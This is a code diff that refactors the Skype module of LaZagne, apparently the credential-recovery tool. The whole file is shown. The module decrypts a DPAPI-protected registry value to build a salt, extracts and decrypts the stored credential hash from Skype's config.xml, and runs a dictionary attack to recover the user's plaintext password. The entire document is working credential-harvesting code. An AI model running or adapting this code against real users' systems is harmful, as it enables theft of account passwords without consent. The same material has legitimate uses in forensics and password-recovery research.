@@ -1,160 +1,163 @@
 # -*- coding: utf-8 -*-
-from lazagne.config.crypto.pyaes.aes import AESModeOfOperationCBC
-from lazagne.config.write_output import print_debug
-from lazagne.config.module_info import ModuleInfo
-from lazagne.config.dico import get_dico
-from lazagne.config.winstructure import *
-from lazagne.config.constant import *
-import xml.etree.cElementTree as ET
-import _winreg
-import hashlib
 import binascii
-import struct
+import hashlib
 import os
+import struct
+from xml.etree.cElementTree import ElementTree
+
+import _winreg
+
+import lazagne.config.winstructure as win
+from lazagne.config.constant import constant
+from lazagne.config.crypto.pyaes.aes import AESModeOfOperationCBC
+from lazagne.config.dico import get_dico
+from lazagne.config.module_info import ModuleInfo
+from lazagne.config.write_output import print_debug
+
 
 class Skype(ModuleInfo):
-	def __init__(self):
-		ModuleInfo.__init__(self, 'skype', 'chats', dpapi_used=True)
+    def __init__(self):
+        ModuleInfo.__init__(self, 'skype', 'chats', dpapi_used=True)
 
-		self.pwdFound = []
+        self.pwdFound = []
 
-	def aes_encrypt(self, message, passphrase):
-		iv = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-		aes = AESModeOfOperationCBC(passphrase, iv=iv)
-		return aes.encrypt(message)
+    def aes_encrypt(self, message, passphrase):
+        iv = '\x00' * 16
+        aes = AESModeOfOperationCBC(passphrase, iv=iv)
+        return aes.encrypt(message)
 
-	# get value used to build the salt
-	def get_regkey(self):
-		try:
-			keyPath = 'Software\\Skype\\ProtectedStorage'
-			try:
-				hkey = OpenKey(HKEY_CURRENT_USER, keyPath)
-			except Exception, e:
-				print_debug('DEBUG', str(e))
-				return False
+    # get value used to build the salt
+    def get_regkey(self):
+        try:
+            key_path = 'Software\\Skype\\ProtectedStorage'
+            try:
+                hkey = win.OpenKey(win.HKEY_CURRENT_USER, key_path)
+            except Exception, e:
+                print_debug('DEBUG', str(e))
+                return False
 
-			num = _winreg.QueryInfoKey(hkey)[1]
-			k = _winreg.EnumValue(hkey, 0)[1]
-			return Win32CryptUnprotectData(k)
-		except Exception,e:
-			print_debug('DEBUG', str(e))
-			return False
+            # num = _winreg.QueryInfoKey(hkey)[1]
+            k = _winreg.EnumValue(hkey, 0)[1]
+            return win.Win32CryptUnprotectData(k)
+        except Exception as e:
+            print_debug('DEBUG', str(e))
+            return False
 
-	# get hash from lazagne.configuration file
-	def get_hash_credential(self, xml_file):
-		tree = ET.ElementTree(file=xml_file)
-		encrypted_hash = tree.find('Lib/Account/Credentials3')
-		if encrypted_hash != None:
-			return encrypted_hash.text
-		else:
-			return False
+    # get hash from lazagne.configuration file
+    def get_hash_credential(self, xml_file):
+        tree = ElementTree(file=xml_file)
+        encrypted_hash = tree.find('Lib/Account/Credentials3')
+        if encrypted_hash is not None:
+            return encrypted_hash.text
+        else:
+            return False
 
-	# decrypt hash to get the md5 to bruteforce
-	def get_md5_hash(self, enc_hex, key):
-		# convert hash from hex to binary
-		enc_binary = binascii.unhexlify(enc_hex)
+    # decrypt hash to get the md5 to bruteforce
+    def get_md5_hash(self, enc_hex, key):
+        # convert hash from hex to binary
+        enc_binary = binascii.unhexlify(enc_hex)
 
-		# retrieve the salt
-		salt =  hashlib.sha1('\x00\x00\x00\x00' + key).digest() + hashlib.sha1('\x00\x00\x00\x01' + key).digest()
+        # retrieve the salt
+        salt = hashlib.sha1('\x00\x00\x00\x00' + key).digest() + hashlib.sha1('\x00\x00\x00\x01' + key).digest()
 
-		# encrypt value used with the XOR operation
-		aes_key = self.aes_encrypt(struct.pack('I', 0) * 4, salt[0:32])[0:16]
+        # encrypt value used with the XOR operation
+        aes_key = self.aes_encrypt(struct.pack('I', 0) * 4, salt[0:32])[0:16]
 
-		# XOR operation
-		decrypted = []
-		for d in range(16):
-			decrypted.append(struct.unpack('B', enc_binary[d])[0] ^ struct.unpack('B', aes_key[d])[0])
+        # XOR operation
+        decrypted = []
+        for d in range(16):
+            decrypted.append(struct.unpack('B', enc_binary[d])[0] ^ struct.unpack('B', aes_key[d])[0])
 
-		# cast the result byte
-		tmp = ''
-		for dec in decrypted:
-			tmp = tmp + struct.pack(">I", dec).strip('\x00')
+        # cast the result byte
+        tmp = ''
+        for dec in decrypted:
+            tmp = tmp + struct.pack(">I", dec).strip('\x00')
 
-		# byte to hex
-		return binascii.hexlify(tmp)
+        # byte to hex
+        return binascii.hexlify(tmp)
 
-	# used for dictionary attack, if user specify a specific file
-	def get_dic_file(self, dictionary_path):
-		words = []
-		if dictionary_path:
-			try:
-				dicFile = open (dictionary_path, 'r')
-			except Exception,e:
-				print_debug('DEBUG', str(e))
-				print_debug('ERROR', u'Unable to open passwords file: %s' % str(dictionary_path))
-				return []
+    # used for dictionary attack, if user specify a specific file
+    def get_dic_file(self, dictionary_path):
+        words = []
+        if dictionary_path:
+            try:
+                dic_file = open(dictionary_path, 'r')
+            except Exception, e:
+                print_debug('DEBUG', str(e))
+                print_debug('ERROR', u'Unable to open passwords file: %s' % str(dictionary_path))
+                return []
 
-			for word in dicFile.readlines():
-				words.append(word.strip('\n'))
-			dicFile.close()
-		return words
+            for word in dic_file.readlines():
+                words.append(word.strip('\n'))
+            dic_file.close()
+        return words
 
-	def dictionary_attack(self, login, md5):
-		wordlist = get_dico()
+    def dictionary_attack(self, login, md5):
+        wordlist = get_dico()
 
-		# if the user specify the file path
-		if constant.path:
-			wordlist += self.get_dic_file(constant.path)
+        # if the user specify the file path
+        if constant.path:
+            wordlist += self.get_dic_file(constant.path)
 
-		for word in wordlist:
-			hash = hashlib.md5('%s\nskyper\n%s' % (login, word)).hexdigest()
-			if hash == md5:
-				return word
-		return False
+        for word in wordlist:
+            hash_ = hashlib.md5('%s\nskyper\n%s' % (login, word)).hexdigest()
+            if hash_ == md5:
+                return word
+        return False
 
-	def get_username(self, path):
-		xml_file = os.path.join(path, u'shared.xml')
-		if os.path.exists(xml_file):
-			tree = ET.ElementTree(file=xml_file)
-			username = tree.find('Lib/Account/Default')
-			try:
-				return unicode(username.text)
-			except:
-				pass
-		return False
+    def get_username(self, path):
+        xml_file = os.path.join(path, u'shared.xml')
+        if os.path.exists(xml_file):
+            tree = ElementTree(file=xml_file)
+            username = tree.find('Lib/Account/Default')
+            try:
+                return unicode(username.text)
+            except Exception:
+                pass
+        return False
 
-	def get_info(self, key, username, path):
-		if os.path.exists(os.path.join(path, u'config.xml')):
-			values = {}
+    def get_info(self, key, username, path):
+        if os.path.exists(os.path.join(path, u'config.xml')):
+            values = {}
 
-			try:
-				values['Login'] = username
+            try:
+                values['Login'] = username
 
-				# get encrypted hash from the config file
-				enc_hex = self.get_hash_credential(os.path.join(path, u'config.xml'))
+                # get encrypted hash from the config file
+                enc_hex = self.get_hash_credential(os.path.join(path, u'config.xml'))
 
-				if not enc_hex:
-					print_debug('WARNING', u'No credential stored on the config.xml file.')
-				else:
-					# decrypt the hash to get the md5 to brue force
-					values['Hash'] = self.get_md5_hash(enc_hex, key)
-					values['Pattern to bruteforce using md5'] = unicode(values['Login']) + u'\\nskyper\\n<password>'
+                if not enc_hex:
+                    print_debug('WARNING', u'No credential stored on the config.xml file.')
+                else:
+                    # decrypt the hash to get the md5 to brue force
+                    values['Hash'] = self.get_md5_hash(enc_hex, key)
+                    values['Pattern to bruteforce using md5'] = unicode(values['Login']) + u'\\nskyper\\n<password>'
 
-					# Try a dictionary attack on the hash
-					password = self.dictionary_attack(values['Login'], values['Hash'])
-					if password:
-						values['Password'] = password
+                    # Try a dictionary attack on the hash
+                    password = self.dictionary_attack(values['Login'], values['Hash'])
+                    if password:
+                        values['Password'] = password
 
-					self.pwdFound.append(values)
-			except Exception,e:
-				print_debug('DEBUG', str(e))
+                    self.pwdFound.append(values)
+            except Exception as e:
+                print_debug('DEBUG', str(e))
 
-	def run(self, software_name=None):
-		path = os.path.join(constant.profile['APPDATA'], u'Skype')
-		if os.path.exists(path):
-			# retrieve the key used to build the salt
-			key = self.get_regkey()
-			if not key:
-				print_debug('ERROR', u'The salt has not been retrieved')
-			else:
-				username = self.get_username(path)
-				if username:
-					d = os.path.join(path, username)
-					if os.path.exists(d):
-						self.get_info(key, username, d)
+    def run(self, software_name=None):
+        path = os.path.join(constant.profile['APPDATA'], u'Skype')
+        if os.path.exists(path):
+            # retrieve the key used to build the salt
+            key = self.get_regkey()
+            if not key:
+                print_debug('ERROR', u'The salt has not been retrieved')
+            else:
+                username = self.get_username(path)
+                if username:
+                    d = os.path.join(path, username)
+                    if os.path.exists(d):
+                        self.get_info(key, username, d)
 
-				if not self.pwdFound:
-					for d in os.listdir(path):
-						self.get_info(key, d, os.path.join(path, d))
+                if not self.pwdFound:
+                    for d in os.listdir(path):
+                        self.get_info(key, d, os.path.join(path, d))
 
-				return self.pwdFound
+                return self.pwdFound
